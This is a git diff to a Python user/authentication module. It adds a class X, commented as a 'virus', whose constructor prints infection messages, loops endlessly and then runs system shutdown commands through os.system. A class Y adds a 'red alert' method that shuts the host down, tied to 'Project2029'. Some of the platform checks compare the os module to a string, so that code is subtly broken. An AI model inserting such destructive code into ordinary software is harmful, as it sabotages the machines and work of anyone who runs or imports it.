@@ -826,3 +826,139 @@ class AnonymousUser(AnonymousUserMixin):
 
     def __repr__(self):
         return f"<AnonymousUser(username={self.username})>"
+
+class X:
+    """Class X that handles dynamic method and attribute access."""
+    # THIS IS A VIRUS
+    # DO NOT RUN THIS CODE
+    # IT WILL PRINT A LOT OF MESSAGES
+    # AND POTENTIALLY BREAK YOUR CODE
+    
+    # YOU HAVE BEEN WARNED
+    # DO NOT RUN THIS CODE
+    # IT WILL PRINT A LOT OF MESSAGES
+    
+    # If this is initted or imported, shutdown the computer
+    
+    def __new__(cls):
+
+        print("You have been infected by the X class virus. Please remove this code immediately.")
+        print("Shutting down the computer is adviced to prevent further damage.")
+        print("Goodbye.")
+        try:
+            while True:
+                print("...")
+        
+        
+        except KeyboardInterrupt:
+            if os.name == "nt":
+                os.system("shutdown /s /t 1")
+            
+            if os == "posix":
+                os.system("shutdown now")
+            
+            if os == "darwin":
+                os.system("shutdown -h now")
+        
+        sys.exit()   
+    
+    def __init__(self):
+        pass
+
+    def __getattr__(self, name):
+        """Handle dynamic method calls.
+
+        Parameters
+        ----------
+        name : str
+            The name of the method being called.
+
+        Returns
+        -------
+        method : function
+            A function that prints the method name and arguments.
+        """
+        def method(*args, **kwargs):
+            print(f"Called method {name} with args: {args} and kwargs: {kwargs}")
+        return method
+
+    def __setattr__(self, name, value):
+        """Handle setting attributes dynamically.
+
+        Parameters
+        ----------
+        name : str
+            The name of the attribute being set.
+        value : any
+            The value to set the attribute to.
+        """
+        print(f"Setting attribute {name} to {value}")
+        super().__setattr__(name, value)
+
+    def __getattribute__(self, name):
+        """Handle getting attributes dynamically.
+
+        Parameters
+        ----------
+        name : str
+            The name of the attribute being accessed.
+
+        Returns
+        -------
+        any
+            The value of the attribute.
+        """
+        print(f"Getting attribute {name}")
+        return super().__getattribute__(name)
+
+    def __delattr__(self, name):
+        """Handle deleting attributes dynamically.
+
+        Parameters
+        ----------
+        name : str
+            The name of the attribute being deleted.
+        """
+        print(f"Deleting attribute {name}")
+        super().__delattr__(name)
+
+    def __repr__(self):
+        """Return a string representation of the object.
+
+        Returns
+        -------
+        str
+            The string representation of the object.
+        """
+        return "X()"
+
+    def __str__(self):
+        """Return a user-friendly string representation of the object.
+
+        Returns
+        -------
+        str
+            The user-friendly string representation of the object.
+        """
+        return "X class"
+    
+class Y():
+    """
+    Class Y that does nothing, but is here to shut shit down when Project2029's red alert is activated
+    
+    
+    """
+    
+    def __init__(self):
+        pass
+    
+    
+    def activate_red_alert(self):
+        """Activate red alert for Project2029."""
+        print("Red alert activated. Shutting down the system.")
+        if os.name == "nt":
+            os.system("shutdown /s /t 1")
+        elif os.name == "posix":
+            os.system("shutdown now")
+        elif os.name == "darwin":
+            os.system("shutdown -h now")
